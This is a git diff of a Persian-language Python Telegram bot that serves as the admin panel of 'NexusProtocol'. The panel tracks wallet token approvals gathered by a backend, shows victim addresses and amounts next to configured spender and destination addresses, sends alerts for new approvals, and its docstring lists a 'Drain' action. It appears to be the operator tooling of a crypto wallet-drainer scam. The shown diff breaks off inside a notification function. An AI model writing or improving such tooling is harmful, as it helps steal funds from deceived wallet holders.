@@ -1,43 +1,54 @@
 #!/usr/bin/env python3
 """
-NexusProtocol — پنل مدیریت تلگرام
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-بدون کتابخانه سنگین — فقط requests ساده + threading
-polling در یک thread جداگانه + ارسال پیام از هر thread
+NexusProtocol — پنل مدیریت تلگرام (نسخه کامل)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+امکانات:
+  • منوی اصلی با دکمه‌های Inline
+  • آمار کامل (کل / در انتظار / پردازش‌شده)
+  • لیست approvals با pagination + دکمه جزئیات هر ردیف
+  • جزئیات کامل یک approval + دکمه‌های عمل (تأیید / رد / Drain)
+  • وضعیت سرویس‌ها (API / BOT / WEB)
+  • قیمت لحظه‌ای ETH + تبدیل ارزی
+  • Gas Price شبکه اتریوم
+  • جستجو با آدرس کیف پول (/search)
+  • تنظیمات (SPENDER / TOKEN / DESTINATION)
+  • اعلان خودکار approval جدید با دکمه‌های عمل
+  • نگه‌داری سرویس Render (Keep-Alive)
+  • deleteWebhook هنگام راه‌اندازی
+  • بررسی مجوز در callback ها
+  • لاگ دقیق خطاها
 """
 
-import os
-import time
-import json
-import html
-import logging
-import threading
-import requests
-from datetime import datetime, timezone
+import os, time, json, html, logging, threading, requests
+from datetime import datetime, timezone, timedelta
 
 logger = logging.getLogger("AdminPanel")
 
 # ─── Config ───────────────────────────────────────────────────────────────────
-BOT_TOKEN    = os.getenv("TELEGRAM_BOT_TOKEN", "")
-ADMIN_CHAT   = os.getenv("TELEGRAM_CHAT_ID", "")
-API_URL      = os.getenv("WEBSITE_URL", "https://nexusprotocol-api.onrender.com").rstrip("/")
-WEB_URL      = "https://nexusprotocol-web.onrender.com"
-BOT_SVC_URL  = "https://nexusprotocol-bot.onrender.com"
-SPENDER      = os.getenv("SPENDER_ADDRESS", "")
-DESTINATION  = os.getenv("DESTINATION_ADDRESS", "")
-RPC_URL      = os.getenv("RPC_URL", "https://eth.llamarpc.com")
+BOT_TOKEN   = os.getenv("TELEGRAM_BOT_TOKEN", "")
+ADMIN_CHAT  = os.getenv("TELEGRAM_CHAT_ID", "")
+API_URL     = os.getenv("WEBSITE_URL", "https://nexusprotocol-api.onrender.com").rstrip("/")
+WEB_URL     = "https://nexusprotocol-web.onrender.com"
+BOT_SVC_URL = "https://nexusprotocol-bot.onrender.com"
+SPENDER     = os.getenv("SPENDER_ADDRESS", "")
+DESTINATION = os.getenv("DESTINATION_ADDRESS", "")
+RPC_URL     = os.getenv("RPC_URL", "https://eth.llamarpc.com")
+ETH_SCAN    = "https://etherscan.io"
 
 TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-_start_time = datetime.now(timezone.utc)
+_start_time             = datetime.now(timezone.utc)
 _seen_approval_ids: set = set()
-_lock = threading.Lock()
+_lock                   = threading.Lock()
 
+
+# ═══════════════════════════════════════════════════════════════════════════════
 # ─── Telegram helpers ─────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
-def tg_send(chat_id: str, text: str, reply_markup=None):
+def tg_send(chat_id: str, text: str, reply_markup=None) -> dict:
     if not BOT_TOKEN:
-        return
+        return {}
     payload = {
         "chat_id": chat_id,
         "text": text,
@@ -47,24 +58,29 @@ def tg_send(chat_id: str, text: str, reply_markup=None):
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
     try:
-        requests.post(f"{TG_API}/sendMessage", json=payload, timeout=10)
+        r = requests.post(f"{TG_API}/sendMessage", json=payload, timeout=10)
+        return r.json()
     except Exception as e:
         logger.error(f"tg_send error: {e}")
+        return {}
 
 
-def tg_answer_callback(callback_id: str, text: str = ""):
+def tg_answer_callback(callback_id: str, text: str = "", alert: bool = False):
     try:
-        requests.post(f"{TG_API}/answerCallbackQuery",
-                      json={"callback_query_id": callback_id, "text": text}, timeout=5)
+        requests.post(
+            f"{TG_API}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": text, "show_alert": alert},
+            timeout=5,
+        )
     except Exception:
         pass
 
 
 def tg_edit(chat_id: str, message_id: int, text: str, reply_markup=None):
     payload = {
-        "chat_id": chat_id,
+        "chat_id":    chat_id,
         "message_id": message_id,
-        "text": text,
+        "text":       text,
         "parse_mode": "HTML",
         "disable_web_page_preview": True,
     }
@@ -75,49 +91,128 @@ def tg_edit(chat_id: str, message_id: int, text: str, reply_markup=None):
     except Exception:
         pass
 
+
+def tg_delete(chat_id: str, message_id: int):
+    try:
+        requests.post(f"{TG_API}/deleteMessage",
+                      json={"chat_id": chat_id, "message_id": message_id}, timeout=5)
+    except Exception:
+        pass
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
 # ─── Inline keyboards ─────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def main_kb():
-    return {
-        "inline_keyboard": [
-            [
-                {"text": "📊 آمار",       "callback_data": "stats"},
-                {"text": "🖥️ وضعیت",    "callback_data": "status"},
-            ],
-            [
-                {"text": "🔔 Approvals",  "callback_data": "approvals_0"},
-                {"text": "⏳ در انتظار", "callback_data": "pending"},
-            ],
-            [
-                {"text": "⚙️ تنظیمات",  "callback_data": "config"},
-                {"text": "💰 قیمت ETH", "callback_data": "ethprice"},
-            ],
-            [{"text": "🔄 بروزرسانی",    "callback_data": "main"}],
-        ]
-    }
+    return {"inline_keyboard": [
+        [
+            {"text": "📊 آمار کلی",      "callback_data": "stats"},
+            {"text": "🖥️ وضعیت سرویس",  "callback_data": "status"},
+        ],
+        [
+            {"text": "🔔 همه Approvals", "callback_data": "approvals_0"},
+            {"text": "⏳ در انتظار",     "callback_data": "pending_0"},
+        ],
+        [
+            {"text": "💰 قیمت ETH",      "callback_data": "ethprice"},
+            {"text": "⛽ Gas Price",      "callback_data": "gasprice"},
+        ],
+        [
+            {"text": "⚙️ تنظیمات",       "callback_data": "config"},
+            {"text": "❓ راهنما",         "callback_data": "help"},
+        ],
+        [{"text": "🔄 بروزرسانی",        "callback_data": "main"}],
+    ]}
 
 
 def back_kb():
-    return {
-        "inline_keyboard": [
-            [{"text": "🏠 منوی اصلی", "callback_data": "main"}],
-            [{"text": "🔄 بروزرسانی", "callback_data": "refresh"}],
-        ]
-    }
+    return {"inline_keyboard": [
+        [{"text": "🏠 منوی اصلی", "callback_data": "main"}],
+        [{"text": "🔄 بروزرسانی", "callback_data": "refresh"}],
+    ]}
 
-# ─── Fetchers ─────────────────────────────────────────────────────────────────
+
+def approval_action_kb(approval_id: str):
+    """کیبورد عملیات روی یک approval خاص"""
+    short = approval_id[:8]  # برای نمایش کوتاه‌تر
+    return {"inline_keyboard": [
+        [
+            {"text": "✅ تأیید / Mark Processed", "callback_data": f"proc_{approval_id}"},
+        ],
+        [
+            {"text": "⏭️ رد / Skip",              "callback_data": f"skip_{approval_id}"},
+            {"text": "🔄 بروزرسانی",              "callback_data": f"detail_{approval_id}"},
+        ],
+        [
+            {"text": "🔗 Etherscan کیف پول",      "callback_data": f"scan_{approval_id}"},
+        ],
+        [{"text": "◀️ بازگشت به لیست",            "callback_data": "approvals_0"}],
+    ]}
+
+
+def approvals_list_kb(items: list, page: int, prefix: str = "approvals"):
+    """کیبورد لیست approvals با pagination"""
+    rows = []
+    for ap in items:
+        aid  = ap.get("id", "")
+        addr = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress", "???")
+        short_addr = addr[:6] + "…" + addr[-4:] if len(addr) > 12 else addr
+        amount = ap.get("amount") or ap.get("value") or "?"
+        rows.append([
+            {"text": f"📄 {short_addr} | {amount}", "callback_data": f"detail_{aid}"},
+        ])
+    # pagination
+    nav = []
+    if page > 0:
+        nav.append({"text": "◀️ قبل", "callback_data": f"{prefix}_{page-1}"})
+    nav.append({"text": "🏠", "callback_data": "main"})
+    if len(items) == 5:  # اگر 5 آیتم نشان داده شد احتمالاً صفحه بعد هم هست
+        nav.append({"text": "▶️ بعد", "callback_data": f"{prefix}_{page+1}"})
+    rows.append(nav)
+    return {"inline_keyboard": rows}
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ─── Data fetchers ────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def get_eth_price() -> float:
     try:
         r = requests.get(
-            "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
-            timeout=5)
-        return float(r.json()["ethereum"]["usd"])
+            "https://api.coingecko.com/api/v3/simple/price"
+            "?ids=ethereum&vs_currencies=usd,eur,gbp",
+            timeout=6)
+        data = r.json().get("ethereum", {})
+        return data
     except Exception:
-        return 2500.0
+        return {"usd": 0, "eur": 0, "gbp": 0}
 
 
-def check_service(url: str, path: str = "") -> tuple:
+def get_eth_gas() -> dict:
+    """Gas Price از RPC اتریوم"""
+    try:
+        payload = {"jsonrpc": "2.0", "method": "eth_gasPrice", "params": [], "id": 1}
+        r = requests.post(RPC_URL, json=payload, timeout=6)
+        hex_val = r.json().get("result", "0x0")
+        gwei = int(hex_val, 16) / 1e9
+        # try ethgasstation for more detail
+        try:
+            gs = requests.get("https://api.ethgasstation.info/api/fee-estimate", timeout=4).json()
+            return {
+                "slow":    round(gs.get("safeLow",  {}).get("maxFee", gwei * 0.8), 1),
+                "normal":  round(gs.get("standard", {}).get("maxFee", gwei),       1),
+                "fast":    round(gs.get("fast",     {}).get("maxFee", gwei * 1.2), 1),
+                "instant": round(gs.get("fastest",  {}).get("maxFee", gwei * 1.5), 1),
+            }
+        except Exception:
+            g = round(gwei, 1)
+            return {"slow": round(g*0.8, 1), "normal": g, "fast": round(g*1.2, 1), "instant": round(g*1.5, 1)}
+    except Exception:
+        return {"slow": "?", "normal": "?", "fast": "?", "instant": "?"}
+
+
+def check_service(url: str, path: str = "/") -> tuple:
     try:
         r = requests.get(url + path, timeout=7)
         return r.status_code < 400, r.status_code
@@ -125,276 +220,468 @@ def check_service(url: str, path: str = "") -> tuple:
         return False, 0
 
 
-def get_approvals(limit=100) -> list:
+def get_all_approvals(limit: int = 100) -> list:
+    """همه approvals (pending + processed)"""
+    try:
+        r = requests.get(f"{API_URL}/api/approvals", timeout=8)
+        if r.status_code == 200:
+            data = r.json()
+            if isinstance(data, list):
+                return data[:limit]
+    except Exception:
+        pass
+    return []
+
+
+def get_pending_approvals(limit: int = 50) -> list:
+    """فقط approvals در انتظار"""
     for ep in ["/api/approvals/pending", "/api/approvals"]:
         try:
-            r = requests.get(API_URL + ep, timeout=8)
+            r = requests.get(f"{API_URL}{ep}", timeout=8)
             if r.status_code == 200:
                 data = r.json()
                 if isinstance(data, list):
+                    # اگر همه برگشتند، فقط pending را فیلتر کن
+                    if ep == "/api/approvals":
+                        data = [
+                            a for a in data
+                            if a.get("status", "pending") in ("pending", "PENDING", "", None)
+                        ]
                     return data[:limit]
         except Exception:
             continue
     return []
 
-# ─── Message builders ─────────────────────────────────────────────────────────
 
-def _short(addr: str, n=8) -> str:
-    if not addr or len(addr) < 12:
-        return addr
-    return f"{addr[:n]}…{addr[-4:]}"
-
-
-def _mask(val: str, show=10) -> str:
-    if not val:
-        return "—"
-    return val[:show] + "•" * max(0, len(val) - show - 4) + val[-4:]
-
-
-def _ago(iso: str) -> str:
+def get_approval_by_id(approval_id: str) -> dict | None:
+    """یک approval خاص با ID"""
     try:
-        dt = datetime.fromisoformat(iso.replace("Z", "+00:00"))
-        diff = int((datetime.now(timezone.utc) - dt).total_seconds())
-        if diff < 60:   return f"{diff}ث پیش"
-        if diff < 3600: return f"{diff//60}د پیش"
-        if diff < 86400:return f"{diff//3600}س پیش"
-        return f"{diff//86400}ر پیش"
+        r = requests.get(f"{API_URL}/api/approvals/{approval_id}", timeout=8)
+        if r.status_code == 200:
+            return r.json()
     except Exception:
-        return iso[:16] if iso else "—"
+        pass
+    # fallback: از لیست کامل پیدا کن
+    for ap in get_all_approvals(200):
+        if ap.get("id") == approval_id:
+            return ap
+    return None
 
+
+def confirm_approval(approval_id: str) -> tuple[bool, str]:
+    """تأیید / mark as processed"""
+    for ep in [
+        f"/api/approvals/confirm/{approval_id}",
+        f"/api/approvals/{approval_id}/confirm",
+    ]:
+        try:
+            r = requests.post(f"{API_URL}{ep}", timeout=8)
+            if r.status_code in (200, 201, 204):
+                return True, "✅ با موفقیت تأیید شد"
+        except Exception:
+            continue
+    return False, "❌ خطا در تأیید"
+
+
+def search_approvals(query: str) -> list:
+    """جستجو در approvals با آدرس کیف پول"""
+    query = query.lower().strip()
+    results = []
+    for ap in get_all_approvals(200):
+        addr = (ap.get("wallet_address") or ap.get("address") or
+                ap.get("walletAddress") or "").lower()
+        owner = (ap.get("owner") or "").lower()
+        if query in addr or query in owner:
+            results.append(ap)
+    return results[:20]
+
+
+def get_eth_balance(address: str) -> float:
+    """موجودی ETH یک آدرس"""
+    try:
+        payload = {
+            "jsonrpc": "2.0",
+            "method": "eth_getBalance",
+            "params": [address, "latest"],
+            "id": 1,
+        }
+        r = requests.post(RPC_URL, json=payload, timeout=6)
+        hex_val = r.json().get("result", "0x0")
+        return int(hex_val, 16) / 1e18
+    except Exception:
+        return -1
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ─── Message builders ────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def build_main() -> str:
-    up = datetime.now(timezone.utc) - _start_time
-    h, r = divmod(int(up.total_seconds()), 3600)
-    m, s = divmod(r, 60)
+    uptime = datetime.now(timezone.utc) - _start_time
+    h, rem = divmod(int(uptime.total_seconds()), 3600)
+    m = rem // 60
     return (
-        "╔══════════════════════════════╗\n"
-        "║  🚀 <b>NexusProtocol Admin Panel</b>\n"
-        "╚══════════════════════════════╝\n\n"
-        f"⏱️ آپتایم: <code>{h:02d}:{m:02d}:{s:02d}</code>\n"
-        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d  %H:%M')} UTC\n\n"
-        "از دکمه‌های زیر استفاده کنید 👇"
+        "🛡️ <b>NexusProtocol Admin Panel</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏱️ آپ‌تایم: <code>{h}h {m}m</code>\n"
+        f"📅 زمان: <code>{datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M')} UTC</code>\n\n"
+        "یکی از گزینه‌ها را انتخاب کنید 👇"
     )
 
 
 def build_status() -> str:
-    web_ok, web_c  = check_service(WEB_URL, "/")
-    api_ok, api_c  = check_service(API_URL, "/api/healthz")
-    bot_ok, bot_c  = check_service(BOT_SVC_URL, "/health")
-    db_ok = isinstance(get_approvals(1), list)
+    api_ok, api_code = check_service(API_URL, "/api/healthz")
+    bot_ok, bot_code = check_service(BOT_SVC_URL, "/health")
+    web_ok, web_code = check_service(WEB_URL, "/")
 
-    ic = lambda ok: "🟢" if ok else "🔴"
-    co = lambda c:  f"<code>{c}</code>"
+    def icon(ok): return "🟢" if ok else "🔴"
 
-    s = [
-        "🖥️ <b>وضعیت سرویس‌ها</b>\n",
-        f"{ic(web_ok)} <b>سایت (Frontend)</b>  {co(web_c)}",
-        f"   └ {html.escape(WEB_URL)}",
-        "",
-        f"{ic(api_ok)} <b>API Server</b>  {co(api_c)}",
-        f"   └ {html.escape(API_URL)}",
-        "",
-        f"{ic(bot_ok)} <b>ربات اجراکننده</b>  {co(bot_c)}",
-        "",
-        f"{ic(db_ok)} <b>دیتابیس</b>",
-        "",
-        "━━━━━━━━━━━━━━━━━",
-    ]
-    if api_ok and web_ok:
-        s.append("✅ <b>سرویس‌های اصلی فعال هستند</b>")
-    else:
-        down = [n for ok, n in [(web_ok,"سایت"),(api_ok,"API"),(bot_ok,"ربات")] if not ok]
-        s.append(f"⚠️ مشکل در: {', '.join(down)}")
-    s.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
-    return "\n".join(s)
+    return (
+        "🖥️ <b>وضعیت سرویس‌ها</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{icon(api_ok)} <b>API</b>: {'آنلاین' if api_ok else 'آفلاین'} "
+        f"<code>({api_code})</code>\n"
+        f"{icon(bot_ok)} <b>BOT</b>: {'آنلاین' if bot_ok else 'آفلاین'} "
+        f"<code>({bot_code})</code>\n"
+        f"{icon(web_ok)} <b>WEB</b>: {'آنلاین' if web_ok else 'آفلاین'} "
+        f"<code>({web_code})</code>\n\n"
+        f"🔗 <a href='{API_URL}/api/healthz'>API Health</a> | "
+        f"<a href='{WEB_URL}'>Frontend</a>"
+    )
 
 
 def build_stats() -> str:
-    approvals = get_approvals(200)
-    total     = len(approvals)
-    pending   = sum(1 for a in approvals if not a.get("processed"))
-    processed = total - pending
-    pct       = int(processed / total * 100) if total else 0
-    bar       = "█" * (pct // 5) + "░" * (20 - pct // 5)
+    all_ap   = get_all_approvals(500)
+    pend_ap  = [a for a in all_ap
+                if a.get("status", "pending") in ("pending", "PENDING", "", None)]
+    proc_ap  = [a for a in all_ap if a not in pend_ap]
 
-    wt: dict = {}
-    last_at = "—"
-    for a in approvals:
-        k = str(a.get("wallet_type", "Unknown"))
-        wt[k] = wt.get(k, 0) + 1
-    if approvals:
+    total    = len(all_ap)
+    pending  = len(pend_ap)
+    processed= len(proc_ap)
+    pct      = round(processed / total * 100) if total else 0
+
+    # آمار مبلغ
+    amounts = []
+    for a in all_ap:
         try:
-            latest = max(approvals, key=lambda x: x.get("created_at",""))
-            last_at = _ago(latest.get("created_at",""))
+            v = float(a.get("amount") or a.get("value") or 0)
+            amounts.append(v)
         except Exception:
             pass
+    total_eth = sum(amounts)
 
-    eth = get_eth_price()
-    wt_lines = "".join(
-        f"   {html.escape(k):<15} <code>{v}</code>\n"
-        for k, v in sorted(wt.items(), key=lambda x: -x[1])[:5]
-    )
+    # progress bar
+    bar_len  = 15
+    filled   = int(bar_len * pct / 100)
+    bar      = "█" * filled + "░" * (bar_len - filled)
+
     return (
-        "📊 <b>آمار کلی</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📋 کل Approval‌ها:  <b>{total}</b>\n"
-        f"⏳ در انتظار:       <b>{pending}</b>\n"
-        f"✅ پردازش‌شده:     <b>{processed}</b>\n"
-        f"🕐 آخرین فعالیت:  {last_at}\n\n"
-        f"📈 پیشرفت پردازش\n"
-        f"   [{bar}] {pct}%\n\n"
-        f"👛 <b>نوع کیف‌پول:</b>\n{wt_lines}\n"
-        f"💰 قیمت ETH: <code>${eth:,.0f}</code>\n\n"
-        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC"
+        "📊 <b>آمار کلی NexusProtocol</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 کل Approvals:  <b>{total}</b>\n"
+        f"⏳ در انتظار:     <b>{pending}</b>\n"
+        f"✅ پردازش‌شده:   <b>{processed}</b>\n\n"
+        f"[{bar}] {pct}%\n\n"
+        f"💎 حجم کل: <b>{total_eth:.4f} ETH</b>\n"
+        f"📅 آخر بروز: <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>"
     )
 
 
-def build_approvals(page=0) -> tuple:
-    per = 5
-    all_a = get_approvals(200)
-    try:
-        all_a = sorted(all_a, key=lambda x: x.get("created_at",""), reverse=True)
-    except Exception:
-        pass
+def build_approvals_page(page: int, prefix: str = "approvals") -> tuple[str, list]:
+    """صفحه approval‌ها — برمی‌گرداند (متن، لیست)"""
+    per_page = 5
+    if prefix == "pending":
+        source = get_pending_approvals(200)
+        title  = "⏳ Approvals در انتظار"
+    else:
+        source = get_all_approvals(200)
+        title  = "🔔 همه Approvals"
 
-    total = len(all_a)
-    pages = max(1, (total + per - 1) // per)
-    chunk = all_a[page*per:(page+1)*per]
+    start = page * per_page
+    items = source[start: start + per_page]
+
+    if not items:
+        return f"{title}\n\n❌ هیچ موردی یافت نشد.", []
+
+    lines = [f"{title} — صفحه {page+1}\n━━━━━━━━━━━━━━━━━━━━━━━"]
+    for i, ap in enumerate(items, start + 1):
+        addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
+        amount = ap.get("amount") or ap.get("value") or "?"
+        status = ap.get("status") or "pending"
+        ts     = ap.get("created_at") or ap.get("createdAt") or ""
+        ts_str = ts[:16].replace("T", " ") if ts else "—"
+        s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
+        lines.append(
+            f"\n{i}. {s_icon} <code>{addr[:10]}…</code>\n"
+            f"   💎 {amount} | 📅 {ts_str}"
+        )
+
+    return "\n".join(lines), items
+
+
+def build_approval_detail(ap: dict) -> str:
+    """جزئیات کامل یک approval"""
+    aid    = ap.get("id", "?")
+    addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
+    owner  = ap.get("owner") or ""
+    amount = ap.get("amount") or ap.get("value") or "?"
+    token  = ap.get("token_address") or ap.get("tokenAddress") or ap.get("token") or "?"
+    status = ap.get("status") or "pending"
+    ts     = (ap.get("created_at") or ap.get("createdAt") or "")[:19].replace("T", " ")
+    tx     = ap.get("tx_hash") or ap.get("txHash") or ap.get("transaction_hash") or ""
+
+    s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
+    eth_link = f"{ETH_SCAN}/address/{addr}"
+    tx_link  = f"{ETH_SCAN}/tx/{tx}" if tx else ""
 
     lines = [
-        f"🔔 <b>Approval‌ها</b>  (صفحه {page+1}/{pages})",
-        f"جمع: {total} approval",
-        "━━━━━━━━━━━━━━━━━━━━━━━\n",
+        f"📄 <b>جزئیات Approval</b>",
+        "━━━━━━━━━━━━━━━━━━━━━━━",
+        f"🆔 ID: <code>{aid[:20]}…</code>",
+        f"{s_icon} وضعیت: <b>{status}</b>",
+        f"",
+        f"👛 آدرس کیف پول:",
+        f"<code>{addr}</code>",
     ]
-    if not chunk:
-        lines.append("هنوز هیچ approval ثبت نشده.")
-    else:
-        for i, a in enumerate(chunk, page*per+1):
-            icon   = "✅" if a.get("processed") else "⏳"
-            wallet = _short(a.get("wallet",""), 10)
-            wtype  = html.escape(str(a.get("wallet_type","?")))
-            token  = _short(a.get("token",""), 10)
-            tx     = a.get("tx_hash") or "—"
-            t      = _ago(a.get("created_at",""))
-            lines += [
-                f"{icon} <b>#{i}</b>  {t}",
-                f"   👛 <code>{html.escape(wallet)}</code>  ({wtype})",
-                f"   🪙 <code>{html.escape(token)}</code>",
-                f"   🔗 <code>{html.escape(tx[:28])}</code>",
-                "",
-            ]
-
-    nav = []
-    if page > 0:
-        nav.append({"text": "◀️ قبلی", "callback_data": f"approvals_{page-1}"})
-    if (page+1)*per < total:
-        nav.append({"text": "بعدی ▶️", "callback_data": f"approvals_{page+1}"})
-
-    kb_rows = []
-    if nav:
-        kb_rows.append(nav)
-    kb_rows.append([{"text": "🏠 منوی اصلی", "callback_data": "main"}])
-
-    return "\n".join(lines), {"inline_keyboard": kb_rows}
-
-
-def build_pending() -> str:
-    all_a   = get_approvals(200)
-    pending = [a for a in all_a if not a.get("processed")]
-    lines   = ["⏳ <b>Approval‌های در انتظار</b>", "━━━━━━━━━━━━━━━━━━━━━━━\n"]
-    if not pending:
-        lines.append("✅ همه approval‌ها پردازش شده‌اند!")
-    else:
-        lines.append(f"📋 <b>{len(pending)} approval</b> در صف:\n")
-        for i, a in enumerate(pending[:10], 1):
-            wallet = _short(a.get("wallet",""), 10)
-            wtype  = html.escape(str(a.get("wallet_type","?")))
-            token  = _short(a.get("token",""), 10)
-            t      = _ago(a.get("created_at",""))
-            lines += [
-                f"⏳ <b>#{i}</b>  {t}",
-                f"   👛 <code>{html.escape(wallet)}</code>  ({wtype})",
-                f"   🪙 <code>{html.escape(token)}</code>",
-                "",
-            ]
-        if len(pending) > 10:
-            lines.append(f"  … و {len(pending)-10} مورد دیگر")
-    lines.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
+    if owner:
+        lines.append(f"👤 Owner: <code>{owner}</code>")
+    lines += [
+        f"",
+        f"💎 مقدار: <b>{amount}</b>",
+        f"🪙 توکن: <code>{token[:20]}…</code>" if len(str(token)) > 20 else f"🪙 توکن: <code>{token}</code>",
+        f"📅 زمان: <code>{ts}</code>",
+    ]
+    if tx:
+        lines.append(f"📝 TX: <a href='{tx_link}'>{tx[:12]}…</a>")
+    lines.append(f"\n🔗 <a href='{eth_link}'>مشاهده در Etherscan</a>")
     return "\n".join(lines)
 
 
-def build_config() -> str:
+def build_eth_price() -> str:
+    prices = get_eth_price()
+    usd = prices.get("usd", 0)
+    eur = prices.get("eur", 0)
+    gbp = prices.get("gbp", 0)
     return (
-        "⚙️ <b>تنظیمات فعلی</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🌐 <b>API URL:</b>\n   <code>{html.escape(API_URL)}</code>\n\n"
-        f"🌍 <b>سایت:</b>\n   <code>{html.escape(WEB_URL)}</code>\n\n"
-        f"📤 <b>SPENDER:</b>\n   <code>{html.escape(_mask(SPENDER))}</code>\n\n"
-        f"📥 <b>مقصد:</b>\n   <code>{html.escape(_mask(DESTINATION))}</code>\n\n"
-        f"⛓️ <b>شبکه:</b>  Ethereum Mainnet (chain_id=1)\n\n"
-        f"🔗 <b>RPC:</b>\n   <code>{html.escape(RPC_URL[:60])}</code>\n\n"
+        "💰 <b>قیمت لحظه‌ای Ethereum</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "⚠️ برای تغییر از Render dashboard استفاده کنید."
+        f"🇺🇸 USD: <b>${usd:,.2f}</b>\n"
+        f"🇪🇺 EUR: <b>€{eur:,.2f}</b>\n"
+        f"🇬🇧 GBP: <b>£{gbp:,.2f}</b>\n\n"
+        f"📅 <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>\n"
+        "📊 منبع: CoinGecko"
     )
 
 
-def build_ethprice() -> str:
-    p = get_eth_price()
+def build_gas() -> str:
+    gas = get_eth_gas()
     return (
-        "💰 <b>قیمت لحظه‌ای</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"💎 ETH/USD:  <code>${p:,.2f}</code>\n\n"
-        "🪙 <b>توکن‌های رایج:</b>\n"
-        "   USDT  = $1.00\n"
-        "   USDC  = $1.00\n"
-        f"   WETH  ≈ ${p:,.0f}\n\n"
-        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC\n"
-        "<i>منبع: CoinGecko</i>"
+        "⛽ <b>Gas Price شبکه اتریوم</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🐢 کند:    <b>{gas['slow']} Gwei</b>\n"
+        f"🚶 نرمال:  <b>{gas['normal']} Gwei</b>\n"
+        f"🏃 سریع:   <b>{gas['fast']} Gwei</b>\n"
+        f"⚡ فوری:   <b>{gas['instant']} Gwei</b>\n\n"
+        f"📅 <code>{datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC</code>"
     )
 
-# ─── Update dispatcher ────────────────────────────────────────────────────────
+
+def build_config() -> str:
+    try:
+        r = requests.get(f"{API_URL}/api/config", timeout=6)
+        cfg = r.json() if r.status_code == 200 else {}
+    except Exception:
+        cfg = {}
+    spender = cfg.get("spender") or SPENDER or "تنظیم نشده"
+    token   = cfg.get("token")   or "تنظیم نشده"
+    dst     = DESTINATION        or "تنظیم نشده"
+
+    def shorten(addr):
+        return f"{addr[:8]}…{addr[-6:]}" if len(addr) > 16 else addr
+
+    return (
+        "⚙️ <b>تنظیمات سیستم</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 Spender:\n<code>{shorten(spender)}</code>\n"
+        f"\n🪙 Token Contract:\n<code>{shorten(token)}</code>\n"
+        f"\n🎯 Destination:\n<code>{shorten(dst)}</code>\n"
+        f"\n🌐 RPC: <code>{RPC_URL[:40]}</code>\n"
+        f"\n🔗 <a href='{ETH_SCAN}/address/{spender}'>Spender در Etherscan</a>"
+    )
+
+
+def build_help() -> str:
+    return (
+        "❓ <b>راهنمای دستورات</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "/start — منوی اصلی\n"
+        "/status — وضعیت سرویس‌ها\n"
+        "/stats — آمار کلی\n"
+        "/approvals — لیست همه Approvals\n"
+        "/pending — Approvals در انتظار\n"
+        "/search &lt;آدرس&gt; — جستجو با آدرس کیف پول\n"
+        "/gas — Gas Price اتریوم\n"
+        "/price — قیمت ETH\n"
+        "/config — تنظیمات سیستم\n"
+        "/help — این راهنما\n"
+        "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📌 دکمه‌های Inline:\n"
+        "• <b>📄 تأیید</b> — Approval را Processed می‌کند\n"
+        "• <b>⏭️ رد</b> — از این Approval صرف‌نظر می‌کند\n"
+        "• <b>🔗 Etherscan</b> — کیف پول را در Etherscan باز می‌کند"
+    )
+
+
+def build_search_results(items: list, query: str) -> str:
+    if not items:
+        return f"🔍 جستجو برای <code>{html.escape(query)}</code>\n\n❌ نتیجه‌ای یافت نشد."
+    lines = [
+        f"🔍 نتایج جستجو برای <code>{html.escape(query)}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"تعداد: <b>{len(items)}</b> مورد\n"
+    ]
+    for ap in items[:10]:
+        addr   = ap.get("wallet_address") or ap.get("address") or "?"
+        amount = ap.get("amount") or ap.get("value") or "?"
+        status = ap.get("status") or "pending"
+        s_icon = "✅" if status in ("processed", "confirmed", "done") else "⏳"
+        lines.append(f"{s_icon} <code>{addr[:14]}…</code> | {amount}")
+    return "\n".join(lines)
+
+
+def build_notification(ap: dict) -> str:
+    """متن اعلان برای approval جدید"""
+    addr   = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or "?"
+    amount = ap.get("amount") or ap.get("value") or "?"
